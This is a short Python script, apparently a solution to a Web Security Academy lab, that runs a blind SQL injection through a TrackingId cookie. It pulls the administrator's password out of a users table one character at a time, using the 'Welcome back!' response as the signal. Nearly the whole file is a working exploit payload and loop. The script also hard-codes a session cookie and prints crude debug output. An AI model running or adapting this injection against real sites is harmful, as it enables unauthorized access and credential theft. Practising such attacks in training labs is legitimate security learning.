import requests


letters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
# pos = 2
temp = '0'
password = []

url = 'https://0ab900480320918082387d35009c0008.web-security-academy.net'

for pos in range(1, 25):
    for letter in letters:

        response = requests.get(url, cookies={'TrackingId': f"EbME2WaHOnAcgepr' AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')='{letter}", 'session': 'gNOj7NiH13ZmDLxCMyegmS4KhKfHp0lk'})
        if 'Welcome back!' in response.text:
                    password.append(letter)
                    # temp = '0'
                    pos += 1
                    print( letter, 'yaaaaaaaay', password)
                    break
        else:
                    # temp = letter
                    print(letter, 'fuck')

